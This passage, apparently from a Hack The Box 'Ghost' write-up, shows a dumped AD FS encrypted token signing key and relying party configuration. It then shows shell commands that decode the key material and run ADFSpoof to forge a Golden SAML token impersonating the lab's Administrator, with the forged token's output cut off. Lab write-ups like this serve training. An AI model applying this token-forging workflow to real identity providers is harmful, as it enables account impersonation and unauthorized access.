class="line">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</span><br><span class="line">[-] Encrypted Token Signing Key End</span><br><span class="line"></span><br><span class="line">[-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC</span><br><span class="line">[-] Store location value: CurrentUser</span><br><span class="line">[-] Store name value: My</span><br><span class="line"></span><br><span class="line"><span class="comment">## Reading The Issuer Identifier</span></span><br><span class="line">[-] Issuer Identifier: http://federation.ghost.htb/adfs/services/trust</span><br><span class="line">[-] Detected AD FS 2019</span><br><span class="line">[-] Uncharted territory! This might not work...</span><br><span class="line"><span class="comment">## Reading Relying Party Trust Information from Database</span></span><br><span class="line">[-]</span><br><span class="line">core.ghost.htb</span><br><span class="line"> ==================</span><br><span class="line">    Enabled: True</span><br><span class="line">    Sign-In Protocol: SAML 2.0</span><br><span class="line">    Sign-In Endpoint: https://core.ghost.htb:8443/adfs/saml/postResponse</span><br><span class="line">    Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more<span class="comment">#rsa-sha256</span></span><br><span class="line">    SamlResponseSignatureType: 1;</span><br><span class="line">    Identifier: https://core.ghost.htb:8443</span><br><span class="line">    Access Policy: &lt;PolicyMetadata xmlns:i=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xmlns=<span class="string">&quot;http://schemas.datacontract.org/2012/04/ADFS&quot;</span>&gt;</span><br><span class="line">  &lt;RequireFreshAuthentication&gt;<span class="literal">false</span>&lt;/RequireFreshAuthentication&gt;</span><br><span class="line">  &lt;IssuanceAuthorizationRules&gt;</span><br><span class="line">    &lt;Rule&gt;</span><br><span class="line">      &lt;Conditions&gt;</span><br><span class="line">        &lt;Condition i:<span class="built_in">type</span>=<span class="string">&quot;AlwaysCondition&quot;</span>&gt;</span><br><span class="line">          &lt;Operator&gt;IsPresent&lt;/Operator&gt;</span><br><span class="line">        &lt;/Condition&gt;</span><br><span class="line">      &lt;/Conditions&gt;</span><br><span class="line">    &lt;/Rule&gt;</span><br><span class="line">  &lt;/IssuanceAuthorizationRules&gt;</span><br><span class="line">&lt;/PolicyMetadata&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Access Policy Parameter:</span><br><span class="line"></span><br><span class="line">    Issuance Rules: @RuleTemplate = <span class="string">&quot;LdapClaims&quot;</span></span><br><span class="line">@RuleName = <span class="string">&quot;LdapClaims&quot;</span></span><br><span class="line">c:[Type == <span class="string">&quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname&quot;</span>, Issuer == <span class="string">&quot;AD AUTHORITY&quot;</span>]</span><br><span class="line"> =&gt; issue(store = <span class="string">&quot;Active Directory&quot;</span>, types = (<span class="string">&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&quot;</span>, <span class="string">&quot;http://schemas.xmlsoap.org/claims/CommonName&quot;</span>), query = <span class="string">&quot;;userPrincipalName,sAMAccountName;&#123;0&#125;&quot;</span>, param = c.Value);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>Now this is only the Encrypted PFX alongside the Key. We will now copy the out private key and token signing key and convert them into a better format to be used later. </p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ <span class="built_in">echo</span> <span class="string">&#x27;8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1&#x27;</span> &gt; private.txt</span><br><span class="line">                                                                                                 </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ &gt;....                                                                                        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<span class="string">&#x27; &gt;token-signing-key.txt         </span></span><br><span class="line"><span class="string">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span></span><br><span class="line"><span class="string">â””â”€$ cat token-signing-key.txt| base64 -d &gt; TSK.bin </span></span><br><span class="line"><span class="string">                                                                                                 </span></span><br><span class="line"><span class="string">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span></span><br><span class="line"><span class="string">â””â”€$ cat private.txt| tr -d &quot;-&quot; | xxd -r -p &gt; private.bin </span></span><br></pre></td></tr></table></figure></div>

<p>Now we can forge our Golden SAML token using ADFSpoof tool:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost/ADFSpoof]</span><br><span class="line">â””â”€$ python3 ADFSpoof.py -b TSK.bin private.bin -s <span class="string">&#x27;core.ghost.htb&#x27;</span> saml2 --endpoint <span class="string">&#x27;https://core.ghost.htb:8443/adfs/saml/postResponse&#x27;</span> --nameidformat <span class="string">&#x27;urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress&#x27;</span> --nameid <span class="string">&#x27;Administrator@ghost.htb&#x27;</span> --rpidentifier <span class="string">&#x27;https://core.ghost.htb:8443&#x27;</span> --assertions <span class="string">&#x27;&lt;Attribute Name=&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&quot;&gt;&lt;AttributeValue&gt;Administrator@ghost.htb&lt;/AttributeValue&gt;&lt;/Attribute&gt;&lt;Attribute Name=&quot;http://schemas.xmlsoap.org/claims/CommonName&quot;&gt;&lt;AttributeValue&gt;Administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;&#x27;</span></span><br><span class="line">    ___    ____  ___________                   ____</span><br><span class="line">   /   |  / __ \/ ____/ ___/____  ____  ____  / __/</span><br><span class="line">  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  </span><br><span class="line"> / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  </span><br><span class="line">/_/  |_/_____/_/    /____/ .___/\____/\____/_/     </span><br><span class="line">                        /_/                        </span><br><span class="line"></span><br><span class="line">A tool to <span class="keyword">for</span> AD FS security tokens</span><br><span class="line">Created by @doughsec</span><br><span class="line"></span><br><span class="line">/home/kali/Hackthebox/GHost/ADFSpoof/ADFSpoof.py:96: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.utcnow()</span><br><span class="line">PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfWFlISkhFIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNS0wNC0wNFQwOTowNDo1OC4wMDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vY29yZS5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfSkZPSzlUIiBJc3N1ZUluc3RhbnQ9IjIwMjUtMDQtMDRUMDk6MDQ6NTguMDAwWiIgVmVyc2lvbj0iMi4wIj48SXNzdWVyPmh0dHA6Ly9jb3JlLmdob3N0Lmh0Yi9hZGZzL3NlcnZpY2VzL3RydXN0PC9Jc3N1ZXI%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlNpZ25lZEluZm8%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIvPjxkczpSZWZlcmVuY2UgVVJJPSIjX0pGT0s5VCI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8%2BPGRzOkRpZ2VzdFZhbHVlPml5L1ozSUt3QVpMMi9zRjFPWk9xVTNkSTRSOWdKNTZFNjdjaFI3eXRhQ009PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%2BPGRzOlNpZ25hdHVyZVZhbHVlPlllOHlacFEzVkNvQVlSVUs5cW15akZOMzlYYkVLSUdURWFEVGZOcDQ2ckd4Und